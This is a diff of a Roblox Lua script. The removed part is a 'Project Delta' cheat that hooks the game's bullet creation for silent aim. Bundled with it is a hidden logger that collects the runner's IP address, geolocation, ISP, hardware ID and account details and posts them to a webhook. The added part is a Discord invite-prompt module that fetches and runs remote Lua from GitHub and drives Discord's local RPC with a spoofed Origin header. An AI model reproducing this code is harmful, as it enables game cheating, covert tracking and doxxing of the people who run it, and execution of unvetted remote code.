@@ -1,208 +1,219 @@
-
-local CHEAT_CLIENT = {} do
-    do
-        CHEAT_CLIENT.player = game.Players.LocalPlayer
-        CHEAT_CLIENT.camera = game.Workspace.CurrentCamera
-        CHEAT_CLIENT.mouse = CHEAT_CLIENT.player:GetMouse()
-    end
- 
-    do
-        function CHEAT_CLIENT:get_target()
-            local current_target = nil
-            local maximum_distance = math.huge
-    
-            for i,v in pairs(game.Players:GetPlayers()) do
-                if v == game.Players.LocalPlayer then continue end
-                if v.Character and v.Character:FindFirstChild("HumanoidRootPart") then
-                    local position, on_screen = CHEAT_CLIENT.camera:WorldToViewportPoint(v.Character.HumanoidRootPart.Position)
-                    if not on_screen then continue end
-                    local distance = (Vector2.new(position.X, position.Y - game.GuiService:GetGuiInset(game.GuiService).Y) - Vector2.new(CHEAT_CLIENT.mouse.X, CHEAT_CLIENT.mouse.Y)).Magnitude
-                    if distance > maximum_distance then continue end
-                    current_target = v
-                    maximum_distance = distance
-                end
-            end
-    
-            return current_target
-        end
-    
-        function CHEAT_CLIENT:predict_velocity(target_part, projectile_speed)
-                local velocity = target_part.Velocity
-    
-                local distance = (CHEAT_CLIENT.camera.CFrame.p - target_part.CFrame.p).Magnitude
-                local time_to_hit = (distance / projectile_speed)
-    
-                local predicted_position = target_part.CFrame.p + (velocity * time_to_hit)
-                local delta = (predicted_position - target_part.CFrame.p).Magnitude
-    
-                local final_projectile_speed = projectile_speed - 0.013 * projectile_speed ^ 2 * time_to_hit ^ 2
-    
-                time_to_hit += (delta / final_projectile_speed)
-    
-                return target_part.CFrame.p + (velocity * time_to_hit)
-        end
-    
-        function CHEAT_CLIENT:predict_drop(target_part, projectile_speed, projectile_drop)
-                local distance = (CHEAT_CLIENT.camera.CFrame.p - target_part.CFrame.p).Magnitude
-                local time_to_hit = (distance / projectile_speed)
-    
-                local final_projectile_speed = projectile_speed - 0.013 * projectile_speed ^ 2 * time_to_hit ^ 2
-                time_to_hit += (distance / final_projectile_speed)
-    
-                local drop_timing = projectile_drop * time_to_hit ^ 2
-    
-                if not tostring(drop_timing):find("nan") then
-                    return drop_timing
-                end
-                return 0
-        end
-    
-        function CHEAT_CLIENT:get_bullet_atribute(attribute)
-            local attribute_value = nil
-            local status = game.ReplicatedStorage.Players[CHEAT_CLIENT.player.Name]:FindFirstChild("Status")
-            if status then
-                local equipped_tool = status.GameplayVariables.EquippedTool.Value
-                if equipped_tool then
-                    local inventory_equipped_tool = game.ReplicatedStorage.Players[CHEAT_CLIENT.player.Name].Inventory:FindFirstChild(tostring(equipped_tool))
-                    if inventory_equipped_tool then
-                        local mag = inventory_equipped_tool.Attachments:FindFirstChild("Magazine") and inventory_equipped_tool.Attachments:FindFirstChild("Magazine"):FindFirstChildOfClass("StringValue") and inventory_equipped_tool.Attachments:FindFirstChild("Magazine"):FindFirstChildOfClass("StringValue"):FindFirstChild("ItemProperties").LoadedAmmo or inventory_equipped_tool.ItemProperties:FindFirstChild("LoadedAmmo")
-                        if mag then
-                            local first_bullet_type = mag:FindFirstChild("1")
-                            if first_bullet_type then
-                                attribute_value = game.ReplicatedStorage.AmmoTypes[first_bullet_type:GetAttribute("AmmoType")]:GetAttribute(attribute)
-                            end
-                        end
-                    end
-                end
-            end
-            return attribute_value
-        end
-    end
- end
- 
- local silent_aim_hook; silent_aim_hook = hookfunction(require(game.ReplicatedStorage.Modules.FPS.Bullet).CreateBullet, function(...)
-    local args = {...}
- 
-    if CHEAT_CLIENT:get_target() then
-        local attribute_velocity = CHEAT_CLIENT:get_bullet_atribute("MuzzleVelocity")
-        local attribute_drop = CHEAT_CLIENT:get_bullet_atribute("ProjectileDrop")
-        local target_part = CHEAT_CLIENT:get_target() and CHEAT_CLIENT:get_target().Character:FindFirstChild("Head")
-        if attribute_velocity and attribute_drop and target_part then
-            args[9] = {CFrame = CFrame.new(args[9].CFrame.p, CHEAT_CLIENT:predict_velocity(target_part, attribute_velocity) + Vector3.new(0, CHEAT_CLIENT:predict_drop(target_part, attribute_velocity, attribute_drop), 0))}
-        end
-    end
- 
-    return silent_aim_hook(unpack(args))
- end)
-
-local function a(b)
-    for _,c in ipairs(b:GetDescendants()) do
-        if c:IsA("\66\97\115\101\80\97\114\116") then
-            c.Material=Enum.Material.ForceField
-            c.Color=Color3.new(0.086275, 0.517647, 0.592157)
-        end
-    end
-end
-
+-- Services
+local TweenService = game:GetService("TweenService")
 local HttpService = game:GetService("HttpService")
-local Players = game:GetService("Players")
-local MarketplaceService = game:GetService("MarketplaceService")
-local LocalizationService = game:GetService("LocalizationService")
-local RbxAnalyticsService = game:GetService("RbxAnalyticsService")
-local GroupService = game:GetService("GroupService")
-local BadgeService = game:GetService("BadgeService")
-local UserInputService = game:GetService("UserInputService")
-local Stats = game:GetService("Stats")
+local CoreGui = game:GetService("CoreGui")
 
-local LocalPlayer = Players.LocalPlayer
-local UserId = LocalPlayer.UserId
-local DisplayName = LocalPlayer.DisplayName
-local Username = LocalPlayer.Name
-local MembershipType = tostring(LocalPlayer.MembershipType):sub(21)
-local AccountAge = LocalPlayer.AccountAge
-local Country = LocalizationService.RobloxLocaleId
-local GetIp = game:HttpGet("https://v4.ident.me/")
-local GetData = HttpService:JSONDecode(game:HttpGet("http://ip-api.com/json"))
-local Hwid = RbxAnalyticsService:GetClientId()
-local GameInfo = MarketplaceService:GetProductInfo(game.PlaceId)
-local GameName = GameInfo.Name
-local Platform = (UserInputService.TouchEnabled and not UserInputService.MouseEnabled) and "📱 Mobile" or "💻 PC"
-local Ping = math.round(Stats.Network.ServerStatsItem["Data Ping"]:GetValue())
+-- Variables
+local vynixuModules = {
+	Functions = loadstring(game:HttpGet("https://raw.githubusercontent.com/RegularVynixu/Utilities/main/Functions.lua"))()
+}
+local assets = {
+    DiscordInvitePrompt = LoadCustomInstance("https://github.com/RegularVynixu/Utilities/raw/main/Discord%20Inviter/Assets/DiscordInvitePrompt.rbxm"),
+    NotificationSound = LoadCustomAsset("https://github.com/RegularVynixu/Utilities/raw/main/Discord%20Inviter/Assets/Notification.mp3")
+}
+local module = {}
 
-local function detectExecutor()
-    return identifyexecutor()
+-- Functions
+local function getInviteCode(sInvite)
+    for i = #sInvite, 1, -1 do
+        local char = sInvite:sub(i, i)
+        if char == "/" then
+            return sInvite:sub(i + 1, #sInvite)
+        end
+    end
+    return sInvite
 end
 
-local function createWebhookData()
-    local executor = detectExecutor()
-    local date = os.date("%m/%d/%Y")
-    local time = os.date("%X")
-    local gameLink = "https://www.roblox.com/games/" .. game.PlaceId
-    local playerLink = "https://www.roblox.com/users/" .. UserId
-    local mobileJoinLink = "https://www.roblox.com/games/start?placeId=" .. game.PlaceId .. "&launchData=" .. game.JobId
-    local jobIdLink = "https://www.roblox.com/games/" .. game.PlaceId .. "?jobId=" .. game.JobId
+local function getInviteData(sInvite)
+    local success, result = pcall(function()
+		return HttpService:JSONDecode(request({
+            Url = "https://ptb.discord.com/api/invites/".. getInviteCode(sInvite),
+            Method = "GET"
+        }).Body)
+	end)
+    if not success then
+        warn("Failed to get invite data:\n".. result)
+        return
+    end
+    return success, result
+end
 
-    local data = {
-        username = "AKs Execution Logger",
-        avatar_url = "https://i.imgur.com/AfFp7pu.png",
-        embeds = {
-            {
-                title = "🎮 Game Information",
-                description = string.format("**[%s](%s)**\n`ID: %d`", GameName, gameLink, game.PlaceId),
-                color = tonumber("0x2ecc71")
+local function getInitials(sInvite)
+    local initials = sInvite:sub(1, 1)
+    for i = 1, #sInvite, 1 do
+        local char = sInvite:sub(i, i)
+        if char == " " then
+            initials ..= sInvite:sub(i + 1, i + 1)
+        end
+    end
+    return initials:sub(1, math.min(#initials, 3))
+end
+
+local function make(class, properties)
+    local object = Instance.new(class)
+    for i, v in properties do
+        object[i] = v
+    end
+    return object
+end
+
+local function toggleShowPrompt(promptGui, bool)
+    local frame = promptGui.Holder
+    local serverIcon = frame.ServerIcon
+    local serverInitials = serverIcon.ServerInitials
+    local invited = frame.Invited
+    local serverName = frame.ServerName
+    local accept = frame.Accept
+    local ignore = frame.Ignore
+    
+	if bool then
+		frame.Visible = true
+		TweenService:Create(frame, TweenInfo.new(1, Enum.EasingStyle.Quint), { Size = UDim2.new(0.175, 0, 0.175, 0) }):Play()
+		TweenService:Create(frame.UICorner, TweenInfo.new(1, Enum.EasingStyle.Quint), { CornerRadius = UDim.new(0, 8) }):Play()
+		task.wait(1)
+		TweenService:Create(serverIcon, TweenInfo.new(1, Enum.EasingStyle.Quint), { BackgroundTransparency = 0, ImageTransparency = 0 }):Play()
+		TweenService:Create(serverInitials, TweenInfo.new(1, Enum.EasingStyle.Quint), { TextTransparency = 0 }):Play()
+		task.wait(0.1)
+		TweenService:Create(invited, TweenInfo.new(1, Enum.EasingStyle.Quint), { TextTransparency = 0 }):Play()
+		task.wait(0.1)
+		TweenService:Create(serverName, TweenInfo.new(1, Enum.EasingStyle.Quint), { TextTransparency = 0 }):Play()
+		task.wait(0.1)
+		TweenService:Create(accept, TweenInfo.new(1, Enum.EasingStyle.Quint), { BackgroundTransparency = 0, TextTransparency = 0 }):Play()
+		task.wait(0.1)
+		TweenService:Create(ignore, TweenInfo.new(1, Enum.EasingStyle.Quint), { TextTransparency = 0 }):Play()
+		task.wait(1)
+	else
+		TweenService:Create(ignore, TweenInfo.new(1, Enum.EasingStyle.Quint), { TextTransparency = 1 }):Play()
+		task.wait(0.1)
+		TweenService:Create(accept, TweenInfo.new(1, Enum.EasingStyle.Quint), { BackgroundTransparency = 1, TextTransparency = 1 }):Play()
+		task.wait(0.1)
+		TweenService:Create(serverName, TweenInfo.new(1, Enum.EasingStyle.Quint), { TextTransparency = 1 }):Play()
+		task.wait(0.1)
+		TweenService:Create(invited, TweenInfo.new(1, Enum.EasingStyle.Quint), { TextTransparency = 1 }):Play()
+		task.wait(0.1)
+		TweenService:Create(serverIcon, TweenInfo.new(1, Enum.EasingStyle.Quint), { BackgroundTransparency = 1, ImageTransparency = 1 }):Play()
+		TweenService:Create( serverInitials, TweenInfo.new(1, Enum.EasingStyle.Quint), { TextTransparency = 1 }):Play()
+		task.wait(1)
+		TweenService:Create(frame, TweenInfo.new(1, Enum.EasingStyle.Quint), { Size = UDim2.new() }):Play()
+		TweenService:Create(frame.UICorner, TweenInfo.new(1, Enum.EasingStyle.Quint), { CornerRadius = UDim.new(1, 0) }):Play()
+		task.wait(1)
+		frame.Visible = false
+	end
+end
+
+module.Prompt = function(inviteTable)
+    assert(type(inviteTable) == "table", "<table> Invalid invite table")
+    assert(type(inviteTable.name) == "string", "<string> Invalid invite name")
+    assert(type(inviteTable.invite) == "string", "<string> Invalid invite code")
+    local name = inviteTable.name
+    local invite = inviteTable.invite
+    local success, result = getInviteData(invite)
+    if success and result then
+        local vanity = getInviteCode(invite)
+        
+        -- Invite prompt construction
+        local promptGui = assets.DiscordInvitePrompt:Clone()
+        if promptGui then
+            local holder = promptGui.Holder
+            local serverIcon = holder.ServerIcon
+            local serverInitials = serverIcon.ServerInitials
+            local invited = holder.Invited
+            local serverName = holder.ServerName
+            local accept = holder.Accept
+            local ignore = holder.Ignore
+
+            -- Setup
+            holder.Size = UDim2.new()
+            holder.UICorner.CornerRadius = UDim.new(1, 0)
+            serverName.Text = name
+            accept.Text = `Join <b>{name}</b>`
+            
+            if result.guild.icon ~= nil then
+                serverIcon.Image = LoadCustomAsset(`https://cdn.discordapp.com/icons/{result.guild.id}/{result.guild.icon}.png`)
+            else
+                serverInitials.Text = getInitials(name)
+                serverInitials.Visible = true
+            end
+
+            for _, c in holder:GetDescendants() do
+                if c.ClassName == "TextLabel" or c.ClassName == "TextButton" then
+                    c.BackgroundTransparency = 1
+                    c.TextTransparency = 1
+                elseif c.ClassName == "ImageLabel" then
+                    c.ImageTransparency = 1
+                end
+            end
+
+            -- Display
+            promptGui.Parent = CoreGui
+            toggleShowPrompt(promptGui, true)
+
+            -- Connections
+            local connections = {}
+            local function dismiss(join: bool)
+                for _, c in connections do
+                    c:Disconnect()
+                end
+                if join then
+                    module.Join(invite)
+                end
+                toggleShowPrompt(promptGui, false)
+            end
+
+            connections.acceptEnter = accept.MouseEnter:Connect(function()
+                TweenService:Create(accept, TweenInfo.new(0.15), { BackgroundColor3 = Color3.fromRGB(71, 82, 196) }):Play()
+            end)
+            connections.acceptLeave = accept.MouseLeave:Connect(function()
+                TweenService:Create(accept, TweenInfo.new(0.15), { BackgroundColor3 = Color3.fromRGB(88, 101, 242) }):Play()
+            end)
+            connections.acceptActivated = accept.Activated:Connect(function()
+                dismiss(true)
+            end)
+            do
+                local text = ignore.Text
+                connections.ignoreEnter = ignore.MouseEnter:Connect(function()
+                    ignore.Text = `<u>{text}</u>`
+                end)
+                connections.ignoreLeave = ignore.MouseLeave:Connect(function()
+                    ignore.Text = text
+                end)
+                connections.ignoreActivated = ignore.Activated:Connect(function()
+                    dismiss(false)
+                end)
+            end
+        end
+    end
+end
+
+module.Join = function(sInvite)
+    assert(type(sInvite) == "string", "<string> Invalid invite provided")
+    local success, result = getInviteData(sInvite)
+	if success and result then
+        request({
+            Url = "http://127.0.0.1:6463/rpc?v=1",
+            Method = "POST",
+            Headers = {
+                ["Content-Type"] = "application/json",
+                ["Origin"] = "https://discord.com"
             },
-            {
-                title = "👤 Player Information",
-                description = string.format(
-                    "**Display Name:** [%s](%s)\n**Username:** %s\n**User ID:** %d\n**Membership:** %s\n**Account Age:** %d days\n**Platform:** %s\n**Ping:** %dms",
-                    DisplayName, playerLink, Username, UserId, MembershipType, AccountAge, Platform, Ping
-                ),
-                color = MembershipType == "Premium" and tonumber("0xf1c40f") or tonumber("0x3498db")
-            },
-            {
-                title = "🌐 Location & Network",
-                description = string.format(
-                    "**IP:** `%s`\n**HWID:** `%s`\n**Country:** %s :flag_%s:\n**Region:** %s\n**City:** %s\n**Postal Code:** %s\n**ISP:** %s\n**Organization:** %s\n**Time Zone:** %s",
-                    GetIp, Hwid, GetData.country, string.lower(GetData.countryCode), GetData.regionName, GetData.city, GetData.zip, GetData.isp, GetData.org, GetData.timezone
-                ),
-                color = tonumber("0xe74c3c")
-            },
-            {
-                title = "⚙️ Technical Details",
-                description = string.format(
-                    "**Executor:** `%s`\n**Job ID:** [Click to Copy](%s)\n**Mobile Join:** [Click](%s)",
-                    executor, jobIdLink, mobileJoinLink
-                ),
-                color = tonumber("0x95a5a6"),
-                footer = { 
-                    text = string.format("📅 Date: %s | ⏰ Time: %s", date, time)
-                }
-            }
-        }
-    }
-    return HttpService:JSONEncode(data)
+            Body = HttpService:JSONEncode({
+                cmd = "INVITE_BROWSER",
+                args = {
+                    code = result.code
+                },
+                nonce = HttpService:GenerateGUID(false)
+            })
+        })
+        
+        -- Play notification sound
+        local sound = Instance.new("Sound")
+        sound.Volume = 0
+        sound.PlayOnRemove = true
+        sound.SoundId = assets.NotificationSound
+        sound.Parent = CoreGui
+        sound:Destroy()
+	end
 end
 
-local function sendWebhook(webhookUrl, data)
-    local headers = {["Content-Type"] = "application/json"}
-    local request = http_request or request or HttpPost or syn.request
-    local webhookRequest = {Url = webhookUrl, Body = data, Method = "POST", Headers = headers}
-    request(webhookRequest)
-end
-
-local webhookUrl = ""
-local webhookData = createWebhookData()
-sendWebhook(webhookUrl, webhookData)
-
-
-messagebox("pls open F9", "pls",4)
-printidentity()
-print("hello player is project delta script beta sorry ): discord:mixvpn silent aim 50/50 sorry esp bad use pls infiniteyield esp Goodbye")
-print("https://discord.gg/xbvDUA8eCt")
-warn("nice ip")
-loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
-
-game.Players.LocalPlayer.Character.Humanoid.JumpPower = 28
-while true do wait()
-game.Players.LocalPlayer.Character.Humanoid.UseJumpPower = true
-end
+-- Main
+return module
